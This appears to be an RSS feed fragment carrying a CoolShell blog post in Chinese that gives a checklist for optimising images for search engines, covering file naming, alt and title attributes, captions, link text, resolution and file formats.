+<p style="font-size: 12px; font-family: Arial, Helvetica, sans-serif;"><a href="https://coolshell.cn/wp-content/uploads/2009/10/seo-cartoon.jpg"><img decoding="async" loading="lazy" class="aligncenter size-full wp-image-1529" title="Image SEO" src="https://coolshell.cn/wp-content/uploads/2009/10/seo-cartoon.jpg" alt="Image SEO" width="490" height="272" srcset="https://coolshell.cn/wp-content/uploads/2009/10/seo-cartoon.jpg 490w, https://coolshell.cn/wp-content/uploads/2009/10/seo-cartoon-300x167.jpg 300w, https://coolshell.cn/wp-content/uploads/2009/10/seo-cartoon-360x200.jpg 360w, https://coolshell.cn/wp-content/uploads/2009/10/seo-cartoon-486x270.jpg 486w" sizes="(max-width: 490px) 100vw, 490px" /></a></p>
+<p>在搜索引擎的世界里，有一组有限的因素决定着图片的位置。下面是一个Checklist可以让你把你的图片搜索优化做得更好。</p>
+<p><span id="more-1528"></span></p>
+<ul style="list-style-image: url(http://www.webceo.com/newsletter/images/new_s.png); text-align: justify;">
+<li>首先，你的图片应该是你的网页的一部分，他们使用了相同的样式。例如：页面的Title，head和Body文本必需和图片一样告诉访问者相同的故事。</li>
+<li>在你的服务器上创建一个Images的目录，把你的图片都保存在那里。并且确认搜索引擎可以index这个目录。</li>
+<li>在图片的文件名上使用描述性关键字，使用连字符号分隔关键字，千万不要使用下划线。</li>
+<li>为图片的HTML中&lt;image&gt;标识中的alt属性提供一个简短的描述，你可以认为这是图片的tag，千万不要在alt属性中放入太多的关键字，就算是这些关键字都是相关的。</li>
+<li>可以考虑使用一个短的文本来设置&lt;image&gt;的title属性，其中可以包含关键字。</li>
+<li>在图片的周围可以配上详细的说明来描述这个图片。</li>
+<li>如果你的图片有链接，那么，其链接文本对于图片搜索的rank是相当有用的。</li>
+<li>另一方面，如果你的有其它的页面链接到了某一有重要图片的页面，那么，请创建 keyword-rich 链接文本到这一网页。</li>
+<li>尽量使用高分辨率的图片，如果可能的话，提供不同分辨率的图片。</li>
+<li>避免在Javascript里设置“点击看大图”的链接，Javascript会让搜索引擎导致难以索引的问题。</li>
+<li>检查你图片的缩略图尺寸。缩略图应该到少能让人看清是什么，不然，就算是搜索位置靠前，人们也不会点击。</li>
+<li>把照片存成 .JPG 文件，而其它简单的图片则存成 .GIF文件。搜索引擎会试图把GIF文件认为是256色的，而JPG是真彩色的。</li>
+<li>经常更新你你的图片，因为这是搜索引擎会经常关临并给高分的依据。</li>
+<li>另外，最好在你你的图片上加上水印，这样可以让人们对你的网站增加印象。但水印要恰到好处，不然反而令人生厌。</li>
+</ul>
+<p>文章：<a href="http://www.webceo.com/newsletter/2009/081009.html" target="_blank">来源</a></p>
+<p><!-- InstanceEndEditable --><script type="text/javascript"></script><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/6043.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/30.jpg" alt="Web开发中需要了解的东西" width="150" height="150" /></a><a href="https://coolshell.cn/articles/6043.html" class="wp_rp_title">Web开发中需要了解的东西</a></li><li ><a href="https://coolshell.cn/articles/8619.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/11/shell.01-150x150.png" alt="你可能不知道的Shell" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8619.html" class="wp_rp_title">你可能不知道的Shell</a></li><li ><a href="https://coolshell.cn/articles/2936.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/Mozilla-150x150.jpg" alt="Mozilla的一个BUG" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2936.html" class="wp_rp_title">Mozilla的一个BUG</a></li><li ><a href="https://coolshell.cn/articles/10169.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="类型的本质和函数式实现" width="150" height="150" /></a><a href="https://coolshell.cn/articles/10169.html" class="wp_rp_title">类型的本质和函数式实现</a></li><li ><a href="https://coolshell.cn/articles/7236.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/05/Bannière-Unix-linux-150x150.jpg" alt="用Unix的设计思想来应对多变的需求" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7236.html" class="wp_rp_title">用Unix的设计思想来应对多变的需求</a></li><li ><a href="https://coolshell.cn/articles/3005.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/27.jpg" alt="代码重构的一个示例" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3005.html" class="wp_rp_title">代码重构的一个示例</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1528.html">图片搜索引擎优化Checklist</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1528.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
